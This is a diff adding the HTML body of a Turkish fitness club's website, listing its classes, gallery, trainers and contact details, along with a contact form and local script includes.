+                            <div class="owl-item" style="width: 293px;">
+                                <div class="content-box-item cntbox animated fadeInUp">
+                                    <a>
+                                        <h2 class="content-box-title"> Zumba </h2>
+                                    </a>
+                                    <div class="content-box-detail">
+                                        <a><img src="./index_files/zumba.jpg" title="Zumba" alt="Zumba"></a>
+                                        <p class="content-box-description">
+                                            Zumba, 1990′larda dansçı ve koreograf Alberto “Beto” Perez tarafından Kolombiya’da ortaya çıkarılan,
+                                            Latin esintili bir dans fitness programı olup dünya çapındaki en yaygın dans fitness programıdır.
+                                            hızlı ve yavaş ritmli müziklerle direnç çalışmalarından oluşur
+                                            Zumba, dans ve aerobik figurlerini içerir.
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+
+
+
+
+
+
+
+                    <div class="owl-controls clickable">
+                        <div class="owl-pagination">
+                            <div class="owl-page active"><span class=""></span></div>
+                            <div class="owl-page"><span class=""></span></div>
+                        </div>
+                    </div>
+                </div>
+            </div><!-- /.container -->
+        </div><!-- /.container-fluid -->
+        <div id="upcoming-courses" class="upcoming-courses ow-fluid-section container-fluid">
+            <h2 class="section-title"> DERSLERİMİZ: </h2>
+            <div class="ow-fixed-section container">
+                <ul class="classes-description">
+                    <li class="col-md-6">
+                        <h3 class="pull-left classes-info-title"> <a>Pilates </a> </h3>
+                        <hr>
+                    </li>
+                    <li class="col-md-6">
+                        <h3 class="pull-left classes-info-title"> <a>Core Pilates </a> </h3>
+                        <hr>
+                    </li>
+                    <li class="col-md-6">
+                        <h3 class="pull-left classes-info-title"> <a>Cardio Gym </a> </h3>
+                        <hr>
+                    </li>
+                    <li class="col-md-6">
+                        <h3 class="pull-left classes-info-title"> <a>Spinning </a> </h3>
+                        <hr>
+                    </li>
+                    <li class="col-md-6">
+                        <h3 class="pull-left classes-info-title"> <a>Yoga </a> </h3>
+                        <hr>
+                    </li>
+                    <li class="col-md-6">
+                        <h3 class="pull-left classes-info-title"> <a>Zumba </a> </h3>
+                        <hr>
+                    </li>
+                    <li class="col-md-6">
+                        <h3 class="pull-left classes-info-title"> <a>Kick Box </a> </h3>
+                        <hr>
+                    </li>
+                    <li class="col-md-6">
+                        <h3 class="pull-left classes-info-title"> <a>Boot Camp </a> </h3>
+                        <hr>
+                    </li>
+
+                </ul>
+            </div><!-- /.container -->
+        </div><!-- /.container-fluid -->
+        <div id="programs-timeline" class="programs-timeline ow-fluid-section container-fluid">
+            <div class="section-header">
+                <div class="section-header-left col-md-5">
+                    <h3> </h3>
+                </div>
+                <h3 class="section-title col-md-2 animated fadeInDown">
+                    <span class="">
+                        Uzman eğitmen kadromuzla bire bir derslerle hedeflerinize çok daha kısa zamanda ulaşabilirsiniz.
+                    </span>
+                </h3>
+                <div class="section-header-right col-md-5">
+                    <h3> </h3>
+                </div>
+            </div>
+            <div class="ow-fixed-section container">
+                <style>
+                    .timeline-panel {
+                        min-height: 30px;
+                    }
+                </style>
+                <ul class="timeline" style="margin-top:150px;">
+                    <li class="timeline-item timeline-odd">
+                        <i class="timeline-badge"></i>
+                        <div class="timeline-panel animated fadeInLeft">
+                            <h3 class="classes-info-title"><a><span class="style-super"></span></a></h3>
+                            <div class="timeline-heading">
+                                <h4 class="timeline-title"> Personal Trainer </h4>
+                            </div>
+                        </div>
+                    </li>
+                    <li class="timeline-item timeline-even">
+                        <i class="timeline-badge"></i>
+                        <div class="timeline-panel animated fadeInRight">
+                            <h3 class="classes-info-title"><a><span class="style-bold"></span> <span class="style-super"></span></a></h3>
+                            <div class="timeline-heading">
+                                <h4 class="timeline-title"> Boot Camp </h4>
+                            </div>
+                        </div>
+                    </li>
+                    <li class="timeline-item timeline-odd">
+                        <i class="timeline-badge"></i>
+                        <div class="timeline-panel animated fadeInLeft">
+                            <h3 class="classes-info-title"><a><span class="color-light"></span> <span class="color-normal style-bold"></span></a></h3>
+                            <div class="timeline-heading">
+                                <h4 class="timeline-title"> Yüzme </h4>
+                            </div>
+                        </div>
+                    </li>
+                    <li class="timeline-item timeline-even">
+                        <i class="timeline-badge"></i>
+                        <div class="timeline-panel animated fadeInRight">
+                            <h3 class="classes-info-title"><a><span class="style-bold"></span> <span class="style-super"></span></a></h3>
+                            <div class="timeline-heading">
+                                <h4 class="timeline-title"> Kick Box </h4>
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+            </div><!-- /.container -->
+        </div><!-- /.container-fluid -->
+
+
+        <div id="classes-galleri" class="classes-programs ow-fluid-section container-fluid">
+            <br>
+            <h2 class="section-title"><b>GALERİ</b> </h2>
+            <div class="ow-fixed-section container" style="padding-bottom:25px;">
+
+                <div class="container galleri">
+
+                    <div class="row text-center text-lg-left">
+
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/1(1).jpg" alt="Spinning Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/2.jpg" alt="Salon Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/3.jpg" alt="Hamam Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/4.jpg" alt="Çocuk Odası Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/5(1).jpg" alt="Salon Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/6.jpg" alt="Havuz Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/7(1).jpg" alt="Salon Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/8(1).jpg" alt="Cardio Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/9(1).jpg" alt="Dumbell Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/10.jpg" alt="Salon Dolap Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/11.jpg" alt="Salon Resim">
+                            </a>
+                        </div>
+                        <div class="col-lg-3 col-md-4 col-6">
+                            <a class="d-block mb-4 h-100">
+                                <img class="img-fluid img-thumbnail" src="./index_files/12.jpg" alt="Dumbell Resim">
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+                <!-- /.container -->
+
+                <div class="clearfix" style="display:inline-block; clear:both;"></div>
+                <br>
+
+
+            </div><!-- /.container -->
+        </div><!-- /.container-fluid -->
+
+
+
+        <style>
+            .galleri .col-lg-3 {
+                margin-bottom: 20px !important;
+            }
+        </style>
+
+
+        <div class="quotes ow-fluid-section container-fluid">
+            <div class="ow-fixed-section container">
+                <i><img src="./index_files/quote-before.png"></i>
+                <div class="quotes-inner">
+                    Bugün<br><span class="light-orange">hissettiğiniz acı</span><br>
+                    ancak<br>
+                    yarın hissettiğiniz<span class="light"> güç olacak.</span>
+                </div>
+                <i><img src="./index_files/quote-after.png"></i>
+            </div><!-- /.container -->
+        </div><!-- /.container-fluid -->
+        <div class="tweets ow-fluid-section container-fluid">
+            <div class="ow-fixed-section container">
+                <div class="col-md-5 col-sm-5 section-header">
+                    <h2 class="section-title"> <b>Bizi Takip Edin</b> </h2>
+                </div>
+                <div class="col-md-2 col-sm-2 home-tweet-icon">
+                    <img src="./index_files/tweet-icon.png" alt="Tweeter icon">
+                </div>
+                <div class="col-md-5 col-sm-5 tweets-detail">
+                    <br>
+                    <p>
+                        Kampanyalardan ve Çekilişlerden Haberdar Olmak için bizi Takipte kalın...<br><span class="tweet-link">Takip Et: <a target="_blank" href="https://www.instagram.com/lefclub.atasehir"
+                                title="Instagram Link">https://www.instagram.com/lefclub.atasehir</a></span>
+                    </p>
+                </div>
+            </div><!-- /.container -->
+        </div><!-- /.container-fluid -->
+        <div id="our-trainer" class="our-trainer ow-fluid-section container-fluid">
+            <div class="section-header">
+                <div class="section-header-left col-md-5"></div>
+                <br>
+                <h2 class="section-title col-md-2"><b>EĞİTMENLERİMİZ</b></h2>
+                <div class="section-header-right col-md-5"></div>
+            </div>
+            <div class="ow-fixed-section container">
+                <ul class="trainer-section">
+                    <li class="col-sm-6 col-md-4 col-lg-3 trainer-item">
+                        <div class="chevron-top"></div>
+                        <div class="hexagon">
+                            <div class="hexagon-in1">
+                                <div class="hexagon-in2">
+                                    <img src="./index_files/1(2).jpg" alt="Eğitmen - Personel Trainer">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="chevron-bottom"></div>
+                        <div class="trainer-detail">
+                            <div class="trainer-name">
+                                <b>Semra</b> <br> AKSU
+                            </div>
+                            <hr>
+                            <h4> Plates / Yüzme / Personel Tranier </h4>
+                        </div>
+                    </li>
+                    <li class="col-sm-6 col-md-4 col-lg-3 trainer-item">
+                        <div class="chevron-top"></div>
+                        <div class="hexagon">
+                            <div class="hexagon-in1">
+                                <div class="hexagon-in2">
+                                    <img src="./index_files/2(1).jpg" alt="Eğitmen - Personel Trainer">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="chevron-bottom"></div>
+                        <div class="trainer-detail">
+                            <div class="trainer-name">
+                                <b>Doğukan</b><br> PALA
+                            </div>
+                            <hr>
+                            <h4> Plates / Personel Tranier </h4>
+                        </div>
+                    </li>
+                    <li class="col-sm-6 col-md-4 col-lg-3 trainer-item">
+                        <div class="chevron-top"></div>
+                        <div class="hexagon">
+                            <div class="hexagon-in1">
+                                <div class="hexagon-in2">
+                                    <img src="./index_files/3(1).jpg" alt="Eğitmen - Personel Trainer">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="chevron-bottom"></div>
+                        <div class="trainer-detail">
+                            <div class="trainer-name">
+                                <b>Aida</b> <span style="font-size:0.9em !important">SOLEYMANIPOUR</span>
+                            </div>
+                            <hr>
+                            <h4> Crossfit / Personel Tranier </h4>
+                        </div>
+                    </li>
+                    <li class="col-sm-6 col-md-4 col-lg-3 trainer-item">
+                        <div class="chevron-top"></div>
+                        <div class="hexagon">
+                            <div class="hexagon-in1">
+                                <div class="hexagon-in2">
+                                    <img src="./index_files/17.jpg" alt="Eğitmen - Personel Trainer">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="chevron-bottom"></div>
+                        <div class="trainer-detail">
+                            <div class="trainer-name">
+                                <b>Oytun</b><br>ÇİLİNGİROĞLU
+                            </div>
+                            <hr>
+                            <h4> Yüzme / Personel Tranier </h4>
+                        </div>
+                    </li>
+
+                    <li class="col-sm-6 col-md-4 col-lg-3 trainer-item">
+                        <div class="chevron-top"></div>
+                        <div class="hexagon">
+                            <div class="hexagon-in1">
+                                <div class="hexagon-in2">
+                                    <img src="./index_files/12(1).jpg" alt="Eğitmen - Personel Trainer">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="chevron-bottom"></div>
+                        <div class="trainer-detail">
+                            <div class="trainer-name">
+                                <b>MUSTAFA</b><br> DEMİRBAŞ
+                            </div>
+                            <hr>
+                            <h4>Personel Tranier </h4>
+                        </div>
+                    </li>
+
+                    <li class="col-sm-6 col-md-4 col-lg-3 trainer-item">
+                        <div class="chevron-top"></div>
+                        <div class="hexagon">
+                            <div class="hexagon-in1">
+                                <div class="hexagon-in2">
+                                    <img src="./index_files/11(1).jpg" alt="Eğitmen - Personel Trainer">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="chevron-bottom"></div>
+                        <div class="trainer-detail">
+                            <div class="trainer-name">
+                                <b>SERTAN</b><br>NALKIRAN
+                            </div>
+                            <hr>
+                            <h4> Kickbox / Personel Tranier </h4>
+                        </div>
+                    </li>
+                    <li class="col-sm-6 col-md-4 col-lg-3 trainer-item">
+                        <div class="chevron-top"></div>
+                        <div class="hexagon">
+                            <div class="hexagon-in1">
+                                <div class="hexagon-in2">
+                                    <img src="./index_files/13.jpg" alt="Eğitmen - Personel Trainer">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="chevron-bottom"></div>
+                        <div class="trainer-detail">
+                            <div class="trainer-name">
+                                <b>İSMET</b> <br>ŞİMŞEK
+                            </div>
+                            <hr>
+                            <h4> Personel Tranier </h4>
+                        </div>
+                    </li>
+
+                    <li class="col-sm-6 col-md-4 col-lg-3 trainer-item">
+                        <div class="chevron-top"></div>
+                        <div class="hexagon">
+                            <div class="hexagon-in1">
+                                <div class="hexagon-in2">
+                                    <img src="./index_files/14.JPG" alt="Eğitmen - Personel Trainer">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="chevron-bottom"></div>
+                        <div class="trainer-detail">
+                            <div class="trainer-name">
+                                <b>SEBİDE</b> <br><span style="font-size:0.9em !important">ARASTE AMIR </span>
+                            </div>
+                            <hr>
+                            <h4> Yüzme / Personel Tranier </h4>
+                        </div>
+                    </li>
+
+                </ul>
+            </div><!-- /.container -->
+        </div><!-- /.container-fluid -->
+        <div id="contact" class="contact ow-fluid-section container-fluid">
+            <div class="contact-left col-md-4">&nbsp;</div>
+            <div class="contact-center col-md-4">
+                <h2 class="section-title col-md-2">
+                    <b>İLETİŞİM!</b>
+                </h2>
+                <div class="form-horizontal" data-animated="0">
+                    <div class="result"></div>
+                    <div class="form-group">
+                        <div class="col-md-12 col-lg-6 contact-input">
+                            <label class="sr-only" for="input_name">Adınız Soyadınız</label>
+                            <input type="text" class="form-control txtAdSoyad" id="txtAdSoyad" name="txtAdSoyad" placeholder="Adınız Soyadınız" required="">
+                        </div>
+                        <div class="col-md-12 col-lg-6 contact-input">
+                            <label class="sr-only" for="input_email">E-Mail</label>
+                            <input type="email" class="form-control txtEMail" id="txtEMail" name="txtEMail" placeholder="E-Mail Adresiniz" required="">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="col-md-12 col-lg-6 contact-input">
+                            <label class="sr-only" for="input_email">Telefon</label>
+                            <input type="tel" class="form-control txtTelefon" id="txtTelefon" name="txtTelefon" placeholder="Telefon" required="">
+                        </div>
+                    </div>
+                    <div class="col-md-12 contact-textarea">
+                        <label class="sr-only" for="textarea_message">Mesaj</label>
+                        <textarea class="form-control txtMesaj" id="txtMesaj" name="txtMesaj" placeholder="Mesajınız" rows="7" required=""></textarea>
+                    </div>
+                    <style>
+                        .DivKkvk {
+                            margin-top: 5px;
+                        }
+
+                        .chkKkvk {
+                            width: 25px;
+                            height: 25px;
+                            float: left;
+                            margin-left: 3px;
+                            cursor: pointer;
+                        }
+
+                        .lblKkvk {
+                            float: left;
+                            margin-left: 8px;
+                            margin-top: 5px;
+                        }
+                    </style>
+                    <div class="form-group">
+                        <div class="col-md-12 col-lg-6 contact-input DivKkvk">
+                            <input type="checkbox" class="form-control chkKkvk" id="chkKkvk"> <span class="lblKkvk">
+                                <a target="_blank" href="https://lefclub.com.tr/kkvk.pdf"> Kişisel Verilerin Korunması Kanunu aydınlatma metnini okudum kabul ediyorum.</a>
+                            </span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <div class="col-md-12">
+                            <button class="btn btn-hermes btnGonder" style="display: none;">GÖNDER!</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="contact-detail">
+                    <ul class="col-sm-6 col-md-12 col-lg-6">
+                        <li class="address"> Barbaros Mahallesi Morsümbül Sokak Teknik Yapı Deluxia Palace No:5/A K-2 Spor Salonu, Ataşehir - İSTANBUL </li>
+                        <li class="email"> <u><a href="mailto:info@leffitnessclub.com">info@leffitnessclub.com</a></u> </li>
+                        <li class="phone"> 0216 688 54 33 </li>
+                    </ul>
+                    <div class="col-sm-6 col-md-12 col-lg-6">
+                        <iframe src="./index_files/embed.html"></iframe>
+                    </div>
+                </div>
+            </div>
+            <div class="contact-right col-md-4"> </div>
+        </div><!-- /.container-fluid -->
+        <footer class="footer-section ow-fluid-section container-fluid">
+            <div class="footer-logo-section container">
+                <a href="https://lefclub.com.tr/index.html"><img src="./index_files/logo.png" class="footer-logo" alt="footer logo"></a>
+            </div>
+
+
+            <a href="javascript:" id="back-to-top" style="display: none;"><i class="fa fa-arrow-up"></i></a>
+            <div class="ow-fixed-section copyright-notice container">
+                Copyright © LefClub 2019. Tüm Hakları Saklıdır.
+            </div><!-- /.container -->
+        </footer><!-- /.container-fluid -->
+    </div><!-- /container -->
+    <!-- Hidden iframe for submitting forms -->
+    <iframe src="./index_files/saved_resource(2).html" name="hidden" class="hide"></iframe>
+    <!-- jQuery Include -->
+    <script src="./index_files/jquery.min.js"></script>
+
+
+    <script src="./index_files/modernizr.custom.js"></script>
+    <!-- bootstrap -->
+    <script src="./index_files/bootstrap.min.js"></script> <!-- Core Bootstrap v3.2.0 -->
+    <!-- Third-Party Libraries -->
+    <script src="./index_files/jquery.easing.min.js"></script><!-- Easing Animation Effect -->
+    <script src="./index_files/wow.min.js"></script> <!-- WOW Animation Effect -->
+    <script src="./index_files/owl.carousel.min.js"></script> <!-- OWL Carousel -->
+    <script src="./index_files/jquery.flexslider.js"></script> <!-- Flex Photos Slider -->
+    <script src="./index_files/responsive-calendar.js"></script> <!-- Responsive Calendar -->
+    <script src="./index_files/jquery.animateNumber.min.js"></script> <!-- Used for Animated Numbers -->
+    <script src="./index_files/jquery.appear.js"></script> <!-- It Loads jQuery when element is appears -->
+    <script src="./index_files/jquery.knob.js"></script> <!-- Used for Loading Circle -->
+    <script src="./index_files/classie.js"></script>
+    <script src="./index_files/pathLoader.js"></script>
+    <script src="./index_files/main.js"></script>
+    <!-- Customized Scripts -->
+    <script src="./index_files/hermes.js"></script>
+
+</body>
+
+</html>
